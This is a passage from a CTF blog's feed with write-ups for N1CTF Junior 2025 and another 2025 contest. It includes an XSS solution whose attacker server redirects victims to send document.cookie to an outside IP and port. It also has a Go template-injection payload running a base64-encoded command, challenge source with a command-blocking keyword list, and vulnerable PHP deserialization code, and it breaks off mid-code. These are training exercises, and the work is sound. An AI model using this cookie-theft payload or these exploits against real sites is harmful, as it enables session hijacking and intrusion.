punctuation">)</span><span class="token punctuation">:</span>    index <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span>    content <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'content'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span><span class="token triple-quoted-string string">"""        location.href = 'http://192.168.1.154:23333/?c=' + document.cookie;    """</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">8000</span><span class="token punctuation">,</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/09/13/N1CTF-Junior-2025-2-2/IMG-20251007040535512.png"></p><p>æ‰€ä»¥æ•´ä¸ªæ­¥éª¤å°±æ˜¯ï¼šåˆ›å»ºä¸¤ä¸ª nodeï¼Œnode0 æ˜¯ base-uri ç»•è¿‡ CSPï¼Œnode1 è§¦å‘ &#x2F;preview å¼¹ cookie</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;ZianTT çš„ wpï¼š &lt;a href=&quot;https://mp.weixin.qq.com/s/NtgULOY4uKJ5MT3L5WLcqA&quot;&gt;https://mp.weixin.qq.com/s/NtgULOY4uKJ5MT3L5WLcqA&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;A5rZ çš„ wpï¼š &lt;a href=&quot;https://blog.csdn.net/weixin_59166557/article/details/151723712&quot;&gt;https://blog.csdn.net/weixin_59166557/article/details/151723712&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Sh_eePppp çš„ wpï¼š &lt;a href=&quot;https://sheep-sys-sudo.github.io/n1CTF-web-WP/#safenotes&quot;&gt;https://sheep-sys-sudo.github.io/n1CTF-web-WP/#safenotes&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTFçº¿ä¸Šèµ›" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
    <category term="python" scheme="http://c1oudfl0w0.github.io/blog/tags/python/"/>
    
    <category term="XSS" scheme="http://c1oudfl0w0.github.io/blog/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>æ¹¾åŒºæ¯2025</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/09/08/%E6%B9%BE%E5%8C%BA%E6%9D%AF2025/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/09/08/%E6%B9%BE%E5%8C%BA%E6%9D%AF2025/</id>
    <published>2025-09-08T09:34:31.000Z</published>
    <updated>2025-09-19T02:19:50.530Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä¸éš¾</p><span id="more"></span><hr><h1 id="ssti"><a href="#ssti" class="headerlink" title="ssti"></a>ssti</h1><p>æç¤ºæˆ‘ä»¬ <code>&#123;&#123;' enter your payload '&#125;&#125;</code></p><p>æµ‹äº†ä¸€ä¸‹åº”è¯¥ä¸æ˜¯ flaskï¼Œ404 çš„æŠ¥é”™åƒæ˜¯ nodejs æˆ–è€… go çš„ï¼Œæ£€æµ‹åˆ° eval å°±ä¸è§£æï¼Œæµ‹äº†ä¸€ä¸‹ <code>&#123;&#123;.&#125;&#125;</code> æœ‰å›æ˜¾å‘ç°æ˜¯ go çš„æ¨¡æ¿ï¼Œè¿”å›äº† <code>map[B64Decode:0x6ee380 exec:0x6ee120]</code></p><p>æµ‹äº†ä¸€ä¸‹å‘½ä»¤æ‰§è¡Œä¹Ÿæœ‰ wafï¼Œäºæ˜¯å°è¯•è°ƒç”¨è¿™ä¸¤ä¸ªå‡½æ•°ç¼–ç å®ç°å‘½ä»¤æ‰§è¡Œ</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>exec <span class="token punctuation">(</span>B64Decode <span class="token string">"Y2F0IC9mbGFn"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>main.go</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"bytes"</span><span class="token string">"encoding/base64"</span><span class="token string">"fmt"</span><span class="token string">"log"</span><span class="token string">"net/http"</span><span class="token string">"os/exec"</span><span class="token string">"regexp"</span><span class="token string">"runtime"</span><span class="token string">"strings"</span><span class="token string">"text/template"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">execCommand</span><span class="token punctuation">(</span>command <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">&#123;</span><span class="token keyword">var</span> cmd <span class="token operator">*</span>exec<span class="token punctuation">.</span>Cmd<span class="token keyword">if</span> runtime<span class="token punctuation">.</span>GOOS <span class="token operator">==</span> <span class="token string">"windows"</span> <span class="token punctuation">&#123;</span>cmd <span class="token operator">=</span> exec<span class="token punctuation">.</span><span class="token function">Command</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">,</span> <span class="token string">"/c"</span><span class="token punctuation">,</span> command<span class="token punctuation">)</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>cmd <span class="token operator">=</span> exec<span class="token punctuation">.</span><span class="token function">Command</span><span class="token punctuation">(</span><span class="token string">"bash"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> command<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> out bytes<span class="token punctuation">.</span>Buffer<span class="token keyword">var</span> stderr bytes<span class="token punctuation">.</span>Buffercmd<span class="token punctuation">.</span>Stdout <span class="token operator">=</span> <span class="token operator">&amp;</span>outcmd<span class="token punctuation">.</span>Stderr <span class="token operator">=</span> <span class="token operator">&amp;</span>stderrerr <span class="token operator">:=</span> cmd<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> stderr<span class="token punctuation">.</span><span class="token function">Len</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"å‘½ä»¤æ‰§è¡Œé”™è¯¯: %s"</span><span class="token punctuation">,</span> stderr<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"æ‰§è¡Œå¤±è´¥: %v"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> out<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">b64Decode</span><span class="token punctuation">(</span>encoded <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">&#123;</span>decodedBytes<span class="token punctuation">,</span> err <span class="token operator">:=</span> base64<span class="token punctuation">.</span>StdEncoding<span class="token punctuation">.</span><span class="token function">DecodeString</span><span class="token punctuation">(</span>encoded<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token string">"error"</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token function">string</span><span class="token punctuation">(</span>decodedBytes<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">aWAF</span><span class="token punctuation">(</span>next http<span class="token punctuation">.</span>Handler<span class="token punctuation">)</span> http<span class="token punctuation">.</span>Handler <span class="token punctuation">&#123;</span><span class="token keyword">return</span> http<span class="token punctuation">.</span><span class="token function">HandlerFunc</span><span class="token punctuation">(</span><span class="token keyword">func</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> r<span class="token punctuation">.</span>URL<span class="token punctuation">.</span>Path <span class="token operator">!=</span> <span class="token string">"/api"</span> <span class="token punctuation">&#123;</span>next<span class="token punctuation">.</span><span class="token function">ServeHTTP</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span>query <span class="token operator">:=</span> r<span class="token punctuation">.</span>URL<span class="token punctuation">.</span><span class="token function">Query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"template"</span><span class="token punctuation">)</span><span class="token keyword">if</span> query <span class="token operator">==</span> <span class="token string">""</span> <span class="token punctuation">&#123;</span>next<span class="token punctuation">.</span><span class="token function">ServeHTTP</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span>blacklist <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">&#123;</span><span class="token string">"ls"</span><span class="token punctuation">,</span> <span class="token string">"whoami"</span><span class="token punctuation">,</span> <span class="token string">"cat"</span><span class="token punctuation">,</span> <span class="token string">"uname"</span><span class="token punctuation">,</span> <span class="token string">"nc"</span><span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">,</span> <span class="token string">"etc"</span><span class="token punctuation">,</span> <span class="token string">"passwd"</span><span class="token punctuation">,</span> <span class="token string">"\\*"</span><span class="token punctuation">,</span> <span class="token string">"pwd"</span><span class="token punctuation">,</span> <span class="token string">"rm"</span><span class="token punctuation">,</span> <span class="token string">"cp"</span><span class="token punctuation">,</span> <span class="token string">"mv"</span><span class="token punctuation">,</span> <span class="token string">"chmod"</span><span class="token punctuation">,</span> <span class="token string">"chown"</span><span class="token punctuation">,</span> <span class="token string">"wget"</span><span class="token punctuation">,</span> <span class="token string">"curl"</span><span class="token punctuation">,</span> <span class="token string">"bash"</span><span class="token punctuation">,</span> <span class="token string">"sh"</span><span class="token punctuation">,</span> <span class="token string">"python"</span><span class="token punctuation">,</span> <span class="token string">"perl"</span><span class="token punctuation">,</span> <span class="token string">"ruby"</span><span class="token punctuation">,</span> <span class="token string">"system"</span><span class="token punctuation">,</span> <span class="token string">"eval"</span><span class="token punctuation">,</span> <span class="token string">"less"</span><span class="token punctuation">,</span> <span class="token string">"more"</span><span class="token punctuation">,</span> <span class="token string">"find"</span><span class="token punctuation">,</span> <span class="token string">"grep"</span><span class="token punctuation">,</span> <span class="token string">"awk"</span><span class="token punctuation">,</span> <span class="token string">"sed"</span><span class="token punctuation">,</span> <span class="token string">"tar"</span><span class="token punctuation">,</span> <span class="token string">"zip"</span><span class="token punctuation">,</span> <span class="token string">"unzip"</span><span class="token punctuation">,</span> <span class="token string">"gzip"</span><span class="token punctuation">,</span> <span class="token string">"gunzip"</span><span class="token punctuation">,</span> <span class="token string">"bzip2"</span><span class="token punctuation">,</span> <span class="token string">"bunzip2"</span><span class="token punctuation">,</span> <span class="token string">"xz"</span><span class="token punctuation">,</span> <span class="token string">"unxz"</span><span class="token punctuation">,</span> <span class="token string">"docker"</span><span class="token punctuation">,</span> <span class="token string">"kubectl"</span><span class="token punctuation">,</span> <span class="token string">"git"</span><span class="token punctuation">,</span> <span class="token string">"svn"</span><span class="token punctuation">,</span> <span class="token string">"f"</span><span class="token punctuation">,</span> <span class="token string">"l"</span><span class="token punctuation">,</span> <span class="token string">"g"</span><span class="token punctuation">,</span> <span class="token string">","</span><span class="token punctuation">,</span> <span class="token string">"\\?"</span><span class="token punctuation">,</span> <span class="token string">"&amp;&amp;"</span><span class="token punctuation">,</span> <span class="token string">"\\|"</span><span class="token punctuation">,</span> <span class="token string">";"</span><span class="token punctuation">,</span> <span class="token string">"`"</span><span class="token punctuation">,</span> <span class="token string">"\""</span><span class="token punctuation">,</span> <span class="token string">">"</span><span class="token punctuation">,</span> <span class="token string">"&lt;"</span><span class="token punctuation">,</span> <span class="token string">":"</span><span class="token punctuation">,</span> <span class="token string">"="</span><span class="token punctuation">,</span> <span class="token string">"\\("</span><span class="token punctuation">,</span> <span class="token string">"\\)"</span><span class="token punctuation">,</span> <span class="token string">"%"</span><span class="token punctuation">,</span> <span class="token string">"\\\\"</span><span class="token punctuation">,</span> <span class="token string">"\\^"</span><span class="token punctuation">,</span> <span class="token string">"\\$"</span><span class="token punctuation">,</span> <span class="token string">"!"</span><span class="token punctuation">,</span> <span class="token string">"@"</span><span class="token punctuation">,</span> <span class="token string">"#"</span><span class="token punctuation">,</span> <span class="token string">"&amp;"</span><span class="token punctuation">&#125;</span>escaped <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">,</span> <span class="token function">len</span><span class="token punctuation">(</span>blacklist<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i<span class="token punctuation">,</span> item <span class="token operator">:=</span> <span class="token keyword">range</span> blacklist <span class="token punctuation">&#123;</span>escaped<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\\b"</span> <span class="token operator">+</span> item <span class="token operator">+</span> <span class="token string">"\\b"</span><span class="token punctuation">&#125;</span>wafRegex <span class="token operator">:=</span> regexp<span class="token punctuation">.</span><span class="token function">MustCompile</span><span class="token punctuation">(</span>fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"(?i)%s"</span><span class="token punctuation">,</span> strings<span class="token punctuation">.</span><span class="token function">Join</span><span class="token punctuation">(</span>escaped<span class="token punctuation">,</span> <span class="token string">"|"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> wafRegex<span class="token punctuation">.</span><span class="token function">MatchString</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// log.Printf("æ‹¦æˆªè¯·æ±‚: %s", wafRegex.FindAllString(query, -1))</span>http<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> query<span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span>next<span class="token punctuation">.</span><span class="token function">ServeHTTP</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">apiHandler</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>query <span class="token operator">:=</span> r<span class="token punctuation">.</span>URL<span class="token punctuation">.</span><span class="token function">Query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"template"</span><span class="token punctuation">)</span><span class="token keyword">if</span> query <span class="token operator">==</span> <span class="token string">""</span> <span class="token punctuation">&#123;</span>http<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> <span class="token string">"éœ€è¦templateå‚æ•°"</span><span class="token punctuation">,</span> http<span class="token punctuation">.</span>StatusBadRequest<span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span>funcMap <span class="token operator">:=</span> template<span class="token punctuation">.</span>FuncMap<span class="token punctuation">&#123;</span><span class="token string">"exec"</span><span class="token punctuation">:</span>      execCommand<span class="token punctuation">,</span><span class="token string">"B64Decode"</span><span class="token punctuation">:</span> b64Decode<span class="token punctuation">,</span><span class="token punctuation">&#125;</span>tmpl<span class="token punctuation">,</span> err <span class="token operator">:=</span> template<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token string">"api"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Funcs</span><span class="token punctuation">(</span>funcMap<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>http<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> query<span class="token punctuation">,</span> http<span class="token punctuation">.</span>StatusAccepted<span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> buf bytes<span class="token punctuation">.</span>Buffer<span class="token keyword">if</span> err <span class="token operator">:=</span> tmpl<span class="token punctuation">.</span><span class="token function">Execute</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> funcMap<span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>http<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> query<span class="token punctuation">,</span> http<span class="token punctuation">.</span>StatusAccepted<span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span>w<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>buf<span class="token punctuation">.</span><span class="token function">Bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">rootHandler</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> r<span class="token punctuation">.</span>URL<span class="token punctuation">.</span>Path <span class="token operator">!=</span> <span class="token string">"/"</span> <span class="token punctuation">&#123;</span>http<span class="token punctuation">.</span><span class="token function">NotFound</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span>http<span class="token punctuation">.</span><span class="token function">ServeFile</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> r<span class="token punctuation">,</span> <span class="token string">"index.html"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>mux <span class="token operator">:=</span> http<span class="token punctuation">.</span><span class="token function">NewServeMux</span><span class="token punctuation">(</span><span class="token punctuation">)</span>mux<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> rootHandler<span class="token punctuation">)</span>mux<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/api"</span><span class="token punctuation">,</span> apiHandler<span class="token punctuation">)</span>log<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"æœåŠ¡å™¨å¯åŠ¨åœ¨ :80"</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span><span class="token function">ListenAndServe</span><span class="token punctuation">(</span><span class="token string">":80"</span><span class="token punctuation">,</span> <span class="token function">aWAF</span><span class="token punctuation">(</span>mux<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="easy-readfile"><a href="#easy-readfile" class="headerlink" title="easy_readfile"></a>easy_readfile</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Cannot transfer arrays"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/&lt;\?|__HALT_COMPILER|get|Coral|Nimbus|Zephyr|Acheron|ctor|payload|php|filter|base64|rot13|read|data/i'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"You can't do"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Coral</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$pivot</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$k</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">pivot</span><span class="token operator">-></span><span class="token property">ctor</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token variable">$k</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Nimbus</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$handle</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$ctor</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">handle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$arg</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">handle</span><span class="token operator">-></span><span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Zephyr</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$target</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$payload</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$prop</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">target</span><span class="token operator">-></span><span class="token variable">$prop</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">payload</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Acheron</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$mode</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mode</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/tmp/"</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".phar"</span><span class="token punctuation">;</span>            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mode</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"It is file"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You can look at the others"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">52</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span 